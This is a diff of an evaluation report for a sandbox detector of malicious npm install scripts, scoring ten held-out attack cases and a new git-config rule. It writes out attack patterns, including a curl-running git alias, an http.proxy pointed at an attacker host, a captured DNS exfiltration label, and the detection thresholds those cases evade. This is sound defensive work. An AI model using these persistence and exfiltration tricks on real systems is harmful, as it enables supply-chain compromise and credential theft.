@@ -16,16 +16,25 @@ held-out set is supposed to surface and an author-written set cannot.
 | bc01-staged-hooks | staged egress across pre/postinstall | 🛑 Blocked (`NET_RAW_IP`) | the generated stage still connected to a raw IP |
 | bc02-dead-drop | harvest env+`~/.npmrc` to disk | 🛑 Blocked (`CRED_FILE_ACCESS`) | read the bait credential from an install script |
 | bc03-git-hook | write `.git/hooks/post-checkout` | ✅ **MISS** | the hook write is not traced; it fires on a later checkout |
-| bc04-git-alias | `git config` alias with embedded curl | ✅ **MISS** | `git config` is not inspected; curl never execs at install |
+| bc04-git-alias | `git config` alias with embedded curl | 🛑 Blocked (`EXEC_GIT_CONFIG_PERSIST`) | **closed** — the git-config rule added for W14 |
 | bc05-delayed-beacon | detached child connects 6 s post-install | 🛑 Blocked (`NET_RAW_IP`) | the detonation window held long enough to capture it |
 | bc06-platform-gate | egress only on Linux CI | 🛑 Blocked (`NET_RAW_IP`) | ran on Linux and connected |
 | bc07-npm-token | harvest `_authToken`, stage to /tmp | 🛑 Blocked (`CRED_FILE_ACCESS`) | read the bait credential |
 | bc08-dns-exfil | host id hex-encoded in a DNS label | ✅ **MISS** | 24-char label is under the `MIN_ENCODED_LABEL = 40` floor |
 | bc09-path-shadow | git shim + `~/.bashrc` PATH prepend | 🛑 Blocked (`FILE_PERSISTENCE`) | the `~/.bashrc` write tripped the persistence rule |
-| bc10-git-proxy | poison global `git http.proxy` | ✅ **MISS** | `git config` is not inspected; no connection at install |
+| bc10-git-proxy | poison global `git http.proxy` | 🛑 Blocked (`EXEC_GIT_CONFIG_PERSIST`) | **closed** — the git-config rule added for W14 |
 
-**6 of 10 blocked at the rules floor; 4 missed.** The exact 95% interval on 6/10 is wide
-(26–88%) — this is a diagnostic set, not a recall estimate, and should never be quoted as one.
+**As first detonated the rules floor was 6 of 10; after the fix below it is 8 of 10.** Re-score
+the same committed telemetry with `python -m eval.score_blind` to see it — the telemetry is
+unchanged, the rules improved. Two misses remain (bc03, bc08), both needing work that is still
+gated. These are diagnostic cases, not a recall estimate, and should never be quoted as a rate.
+
+**The held-out set found a gap and the fix is measured on it.** bc04 and bc10 both poison `git
+config` (a shell-command alias; `http.proxy`), which no behavioural rule caught because the
+egress is dormant until later git use. `EXEC_GIT_CONFIG_PERSIST` (HIGH) now flags those writes,
+and like every rule here it shipped on a measurement: **0 occurrences of `git config` across all
+742 recorded installs**, so 0 false positives. bc10 in particular goes from the model's mergeable
+*needs-review* to a deterministic **block**. See W14 in `docs/WEAKPOINTS.md`.
 
 Two positives worth noting, both on cases the rules were *not* tuned for:
 - **bc05** — a child that connects 6 s after `npm install` returns was still caught, so the
@@ -36,16 +45,20 @@ Two positives worth noting, both on cases the rules were *not* tuned for:
 ## The gaps, grouped by root cause
 
 **1. `git config` and `.git/hooks` are an untraced attack surface (bc03, bc04, bc10).**
-Three of the four misses are the same hole. An install script can:
+Three of the four original misses were the same hole. An install script can:
 - write an executable `.git/hooks/post-checkout` that beacons on the next checkout (bc03),
 - register a `git config --global alias.X '!curl …'` that runs a command on later git use (bc04),
 - set `git config --global http.proxy http://<attacker>` to MITM future git traffic (bc10).
 
 All three are **dormant at install time** — the payload fires on *later* git activity — so there
-is no connection or dropped binary for a behavioural rule to catch, and nothing inspects the
-`git config` exec args or traces writes under `.git/hooks/` or `~/.gitconfig`. The exec of
-`git config …` *is* recorded (bc04 and bc10 show it in the telemetry, raw IP and all), so the
-evidence is present; no rule reads it.
+is no connection or dropped binary for a behavioural rule to catch.
+
+**Partly closed (bc04, bc10).** The `git config …` exec *is* recorded (the raw IP is right in the
+args), it just was not inspected. `EXEC_GIT_CONFIG_PERSIST` now reads those args and flags the
+dangerous writes (`http.proxy`, `core.hookspath`, a `!`-shell alias, `url.*.insteadOf`), measured
+at 0 across 742 installs. **Still open (bc03):** the `.git/hooks/` *file write* is not traced at
+all — closing it means extending the Chamber's persistence tracing policy to `.git/hooks/` and
+`~/.gitconfig`, a sandbox change that must be deployed and re-measured, so it stays gated.
 
 **2. The DNS encoded-label rule has a length floor a short label evades (bc08).**
 `DNS_ENCODED_LABEL` fires on an encoded-looking label of `MIN_ENCODED_LABEL = 40`+ characters.
@@ -53,7 +66,12 @@ The blind case hex-encodes a hostname into a **24-character** label — real exf
 short identifier — which is under the floor, so the rule stays silent. The DNS query *is*
 captured (`613334386439643930336132.collector.invalid`); only the threshold misses it.
 
-## Full pipeline: the model arm closes all four rules-floor gaps
+## Full pipeline: the model arm closes all four original misses
+
+This was measured against the **first** rules run (6/10), before `EXEC_GIT_CONFIG_PERSIST`
+closed bc04 and bc10. It is kept because it answers a different question — what the *model*
+adds — and the answer stands: the model flags all four cases the deterministic rules missed at
+the time, two of which the rules now also catch.
 
 Running the same committed telemetry through the full pipeline (model prediction + analysis),
 scored `2026-11-03`, recorded in `eval/blind_model_arm.json`:
